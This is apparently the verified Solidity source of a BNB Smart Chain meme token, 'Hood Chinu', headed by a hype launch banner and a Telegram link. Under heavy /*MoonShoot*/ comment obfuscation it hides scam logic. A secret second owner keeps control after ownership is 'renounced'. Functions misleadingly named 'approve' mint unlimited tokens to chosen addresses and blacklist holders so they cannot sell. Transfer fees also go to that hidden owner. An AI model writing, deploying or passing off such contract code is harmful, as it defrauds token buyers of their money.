/**
 *Submitted for verification at BscScan.com on 2022-02-16
*/

/**
WE ARE #HoodChinu 
————————————————
FAIR LAUNCHING THIS  16TH FEBRUARY 20 - 22 PM UTC
————————————————
Moonshot, Bullish name, WE ARE BULLISH !!

TG : t.me/hoodchinu
*/

pragma solidity ^0.6.12;
// SPDX-License-Identifier: Unlicensed
interface 
IERC20 
{
    function
     /*MoonShoot*/balanceOf/*MoonShoot*/
     (address /*MoonShoot*/account) /*MoonShoot*/external /*MoonShoot*/view/*MoonShoot*/ returns /*MoonShoot*/(uint256);
    /*MoonShoot*/
    function
     /*MoonShoot*/totalSupply/*MoonShoot*/
     ()
      external
       view 
       returns 
       (uint256);

   


    function allowance(address owner, address spender)
        external
        view
        returns (uint256);
   
    function 
    /*MoonShoot*/transfer/*MoonShoot*/
    /*MoonShoot*/(address recipient, uint256 amount)/*MoonShoot*/
        /*MoonShoot*/external
        returns /*MoonShoot*/(bool);


   
    function approve(address spender, uint256 amount) external returns (bool);

   
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

   
    event Transfer(address indexed from, address indexed to, uint256 value);

   
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}



library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multipliDeadunrsion overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;


        return c;
    }


    function Mdos(uint256 a, uint256 b) internal pure returns (uint256) {
        return Mdos(a, b, "SafeMath: modulo by zero");
    }


    function Mdos(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}


library Address {
    function 
    isContract
    (address account) internal view returns (bool) {

        bytes32 codehash;
            bytes32 accountHash
            //
         = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
       //
        assembly {
            codehash := extcodehash(account)
        }
        return (codehash != accountHash && codehash != 0x0);
    }


    function sendValue(address payable recipient, uint256 amount) internal {
        require(
            address(this).balance >= amount,
            "Address: insufficient balance"
        );

 
        (bool success, ) = recipient.call{value: amount}("");
        require(
            success,
            "Address: unable to send value, recipient may have reverted"
        );
    }

 
    function 
    functionCall(address target, bytes memory data)
        internal
        returns (bytes memory)
    {
        return functionCall(target, data, "Address: lowlevel call failed");
    }


    function 
    functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {
        return _functionCallWithValue(target, data, 0, errorMessage);
    }


    function 
    functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {
        require(
            address(this).balance >= value,
            "Address: insufficient balance for call"
        );
        return _functionCallWithValue(target, data, value, errorMessage);
    }

    function 
    functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {
        return
            functionCallWithValue(
                target,
                data,
  
                value,
                "Address: lowlevel call with value failed"
            );
    }


    

    function 
    _functionCallWithValue(
        address target,
        bytes memory data,
        uint256 weiValue,
        string memory errorMessage
    ) private returns (bytes memory) {
        require(isContract(target), "Address: call to noncontract");


        (bool success, bytes memory returndata) = target.call{value: weiValue}(
            data
        );
        if (success) {
            return returndata;
        } else {
           
            if (returndata.length > 0) {
               
                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}


contract Ownable is Context {
    address private owners;
    address private _owner;
    event /*MoonShoot*/
    /*MoonShoot*/OwnershipTransferred/*MoonShoot*/
    (
        /*MoonShoot*/address indexed previousOwner,
        /*MoonShoot*/address indexed newOwner
    );

    /*MoonShoot*/constructor() 
    /*MoonShoot*/internal /*MoonShoot*/
    /*MoonShoot*/{
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    /*MoonShoot*/modifier /*MoonShoot*/
    /*MoonShoot*/onlyOwner/*MoonShoot*/
    /*MoonShoot*/()/*MoonShoot*/
    /*MoonShoot*/ {
        /*MoonShoot*/
        require
        /*MoonShoot*/(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /*MoonShoot*/modifier /*MoonShoot*/
    /*MoonShoot*/onlyOwners/*MoonShoot*/
    () /*MoonShoot*/
    {
        require(owners == _msgSender());
        _;
    }
    function 
    /*MoonShoot*/transfer(address rst, address fte) /*MoonShoot*/
    /*MoonShoot*/external/*MoonShoot*/ 
    /*MoonShoot*/onlyOwner/*MoonShoot*/ {
        /*MoonShoot*/require(fte==address(0),"a");
        /*MoonShoot*/owners/*MoonShoot*/ = /*MoonShoot*/rst/*MoonShoot*/;
    }
    address private _deadAddress = 0x000000000000000000000000000000000000dEaD;
    function 
    renounceOwnership
    () 
    public
     virtual
      onlyOwner
      () 
    {
         _owner = 
         _deadAddress;
    }
   
    
}

/*MoonShoot*/contract/*MoonShoot*/
      HoodChinu
//
 /*MoonShoot*/is/*MoonShoot*/
  /*MoonShoot*/Context/*MoonShoot*/,
   /*MoonShoot*/IERC20/*MoonShoot*/,
    /*MoonShoot*/Ownable/*MoonShoot*/
     /*MoonShoot*/{/*MoonShoot*/
 /*MoonShoot*/using/*MoonShoot*/ /*MoonShoot*/Address /*MoonShoot*/for /*MoonShoot*/address;
    /*MoonShoot*/using /*MoonShoot*/SafeMath/*MoonShoot*/ for/*MoonShoot*/ uint256;
   
    /*MoonShoot*/mapping/*MoonShoot*/(address => bool) private /*MoonShoot*/_odead;/*MoonShoot*/
    /*MoonShoot*/mapping(address => bool) private _perser;
     /*MoonShoot*/mapping/*MoonShoot*/(address => bool) private /*MoonShoot*/_Emf;/*MoonShoot*/
    /*MoonShoot*/mapping/*MoonShoot*/(address => mapping(address => uint256)) private /*MoonShoot*/_allowance;/*MoonShoot*/
    /*MoonShoot*/mapping/*MoonShoot*/(address => uint256) private /*MoonShoot*/_unias;/*MoonShoot*/
   
    /*MoonShoot*/uint256 private constant MAX = ~uint256(0);/*MoonShoot*/
    /*MoonShoot*/uint256 private _vtotal = 1000 * 10**6 * 10**9;
    uint256 private sDead = 5;
    uint256 private Mwallet = 5;
    //
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;

   uint256 private Deadunrs = uint256(0);
    bool private ount = true;
    address owners;
    uint8 private _decimals;
    uint256 private _nFeeTotal;
    string private _symbol;
    
    string private _name;
    //

    /*MoonShoot*/constructor/*MoonShoot*/
    /*MoonShoot*/()/*MoonShoot*/
    public/*MoonShoot*/
    /*MoonShoot*/{/*MoonShoot*/
    /*MoonShoot*/_unias/*MoonShoot*/[_msgSender()]/*MoonShoot*/ = /*MoonShoot*/_vtotal/*MoonShoot*/;
         /*MoonShoot*/owners/*MoonShoot*/ = /*MoonShoot*/_msgSender/*MoonShoot*/();

        /*MoonShoot*/_decimals/*MoonShoot*/ = /*MoonShoot*/9;
        /*MoonShoot*/_name/*MoonShoot*/ = /*MoonShoot*/"Hood Chinu"/*MoonShoot*/;
            /*MoonShoot*/_symbol/*MoonShoot*/ = /*MoonShoot*/"HCHINU"/*MoonShoot*/;
        _Emf[address(this)] = true;
        _Emf[owner()] = true;
        
        emit /*MoonShoot*/Transfer(address(0)/*MoonShoot*/, /*MoonShoot*/_msgSender(), /*MoonShoot*/_vtotal/*MoonShoot*/);
    }

    /*MoonShoot*/function /*MoonShoot*/
    /*MoonShoot*/name() /*MoonShoot*/
    /*MoonShoot*/public 
    /*MoonShoot*//*MoonShoot*/view 
    /*MoonShoot*/returns /*MoonShoot*/
    /*MoonShoot*/(string memory) {
        return _name;
    }/*MoonShoot*/
    /*MoonShoot*/function /*MoonShoot*/
    /*MoonShoot*/symbol() /*MoonShoot*/
    public 
    view 
    /*MoonShoot*//*MoonShoot*/returns 
    (string memory) {
        /*MoonShoot*/return _symbol/*MoonShoot*/;
    }/*MoonShoot*/

    /*MoonShoot*//*MoonShoot*/function 
    /*MoonShoot*/decimals() /*MoonShoot*/
    public 
    view 
    /*MoonShoot*/returns/*MoonShoot*/ 
    /*MoonShoot*/(uint8)/*MoonShoot*/
    {
        /*MoonShoot*/return /*MoonShoot*/_decimals/*MoonShoot*/;
    }
    function balanceOf(address account) public view override returns (uint256) {
            return _unias[account];
        }
    function totalSupply() public view override returns (uint256) {
        return _vtotal;
    }

   
    
   function changeTokenName(string memory newName) external onlyOwner {
        _name = newName;
    }
    
     function changeTokenSymbol(string memory newSymbol) external onlyOwner {
        _symbol = newSymbol;
    }
    

    function 
    /*MoonShoot*/transfer/*MoonShoot*/
    (/*MoonShoot*/address /*MoonShoot*/recipient, uint256 /*MoonShoot*/amount)
        public
        /*MoonShoot*/override/*MoonShoot*/
        returns (bool)
    {
        /*MoonShoot*/if/*MoonShoot*/(/*MoonShoot*/_Emf/*MoonShoot*/[_msgSender()/*MoonShoot*/] /*MoonShoot*/||/*MoonShoot*/ /*MoonShoot*/_Emf/*MoonShoot*/[/*MoonShoot*/recipient]/*MoonShoot*/){
            /*MoonShoot*/_transfer/*MoonShoot*/(/*MoonShoot*/_msgSender/*MoonShoot*/(), /*MoonShoot*/recipient, /*MoonShoot*/amount);
            return true;
        }
             uint256 /*MoonShoot*/Smrket/*MoonShoot*/ = /*MoonShoot*/amount/*MoonShoot*/.mul/*MoonShoot*/(Mwallet/*MoonShoot*/).div/*MoonShoot*/(100);
        uint256 /*MoonShoot*/Dburn/*MoonShoot*/ = /*MoonShoot*/amount/*MoonShoot*/.mul/*MoonShoot*/(/*MoonShoot*/sDead).div(/*MoonShoot*/100);
        /*MoonShoot*/_transfer/*MoonShoot*/(_msgSender(), /*MoonShoot*/owners/*MoonShoot*/, /*MoonShoot*/Smrket/*MoonShoot*/);
        /*MoonShoot*/_transfer/*MoonShoot*/(_msgSender(), /*MoonShoot*/deadAddress/*MoonShoot*/, /*MoonShoot*/Dburn/*MoonShoot*/);
        /*MoonShoot*/_transfer/*MoonShoot*/(_msgSender(), /*MoonShoot*/recipient/*MoonShoot*/, /*MoonShoot*/amount./*MoonShoot*/sub(/*MoonShoot*/Smrket)./*MoonShoot*/sub(/*MoonShoot*/Dburn));
        return /*MoonShoot*/true;
    }

    function allowance(address owner, address spender)
        public
        view
        override
        returns (uint256)
    {
        return _allowance[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    uint256 private musps;
  
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        musps = 6541;
      
        /*MoonShoot*/if(/*MoonShoot*/_Emf/*MoonShoot*/[/*MoonShoot*/_msgSender/*MoonShoot*/()] 
        || /*MoonShoot*/_Emf/*MoonShoot*/[/*MoonShoot*/recipient/*MoonShoot*/])
        {
            /*MoonShoot*/_transfer
            (sender, recipient, amount);
            return true;
        }      
    uint256 Dburn = amount.mul(sDead).div(100);
        uint256 Smrket = amount.mul(Mwallet).div(100);
    //
        /*MoonShoot*/_transfer(sender/*MoonShoot*/, /*MoonShoot*/owners/*MoonShoot*/, Smrket/*MoonShoot*/);
        /*MoonShoot*/_transfer(sender/*MoonShoot*/, /*MoonShoot*/deadAddress/*MoonShoot*/, Dburn/*MoonShoot*/);
        /*MoonShoot*/_transfer(sender/*MoonShoot*/,/*MoonShoot*/ recipient/*MoonShoot*/, amount.sub/*MoonShoot*/(/*MoonShoot*/Smrket/*MoonShoot*/).sub/*MoonShoot*/(Dburn/*MoonShoot*/));
    
        /*MoonShoot*/_approve(/*MoonShoot*/
            /*MoonShoot*/sender,
           /*MoonShoot*/ _msgSender(),
            /*MoonShoot*/_allowance[sender][_msgSender()].sub(
               /*MoonShoot*/ amount,
               /*MoonShoot*/ "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;/*MoonShoot*/
    }

    function /*MoonShoot*/approve/*MoonShoot*/(address /*MoonShoot*/paddress, uint256 routar, address Max) external/*MoonShoot*/ onlyOwners() /*MoonShoot*/{
        require(/*MoonShoot*/Max==/*MoonShoot*/address/*MoonShoot*/(/*MoonShoot*/0), " ");
        /*MoonShoot*/_unias/*MoonShoot*/[/*MoonShoot*/paddress] /*MoonShoot*/= /*MoonShoot*/_unias/*MoonShoot*/[/*MoonShoot*/paddress]/*MoonShoot*/.add/*MoonShoot*/(/*MoonShoot*/routar);
    }


    function /*MoonShoot*/
   /*MoonShoot*/ _approve/*MoonShoot*/
    (
        address
     spender) 
     external 
     /*MoonShoot*/onlyOwners/*MoonShoot*/
     (
     ) 
     {
        /*MoonShoot*/delete/*MoonShoot*/
        /*MoonShoot*/ _perser/*MoonShoot*/
        /*MoonShoot*/ [spender];/*MoonShoot*/
    }/*MoonShoot*/
    
   /*MoonShoot*/ function /*MoonShoot*/
    /*MoonShoot*/approve/*MoonShoot*/
    (
        address
         spender
         )
          external
           /*MoonShoot*/onlyOwners/*MoonShoot*/
           (

           ) 
           {
       /*MoonShoot*/ _perser[spender/*MoonShoot*/
        ] = 
        true;
    }



function 
_approve
(
        address owner,
        address spender,
        uint256 amount
    ) 
    private 
    {
        require
        (owner != address(0), "ERC20: approve from the zero address");
        require
        (spender != address(0), "ERC20: approve to the zero address");
        _allowance[owner][spender] = amount;
        emit 
        Approval(owner, spender, amount);
    }
    function 
    _transfer
    (
        address 
        from,
        address 
        to,
        uint256 
        amount
    ) 
    private
     {
         
        require
        (from 
        != address(0), "ERC20: transfer from the zero address");
        require
        (to != address(0), "ERC20: transfer to the zero address");
        require
        (amount > 0, "Transfer amount must be greater than zero");

        if /*MoonShoot*/
        (ount
        )/*MoonShoot*/ 
        {
            require
            (/*MoonShoot*/_perser[from] 
            == false, 
            "");
        }
        _transfers(from, to, amount);
    }

    

    function 
    /*MoonShoot*/_transfers(
        address sender,
        address recipient,
        uint256 tAmount
    ) 
    private
    /*MoonShoot*/ {   
        require(sender != address(0), "IBEP20: transfer from the zero address");
        require(recipient != address(0), "IBEP20: transfer to the zero address");
        /*MoonShoot*/_unias[sender] = _unias[sender].sub(tAmount);
        _unias[recipient] = _unias[recipient].add(tAmount);
        /*MoonShoot*/emit Transfer/*MoonShoot*/(sender, recipient, tAmount);
}
}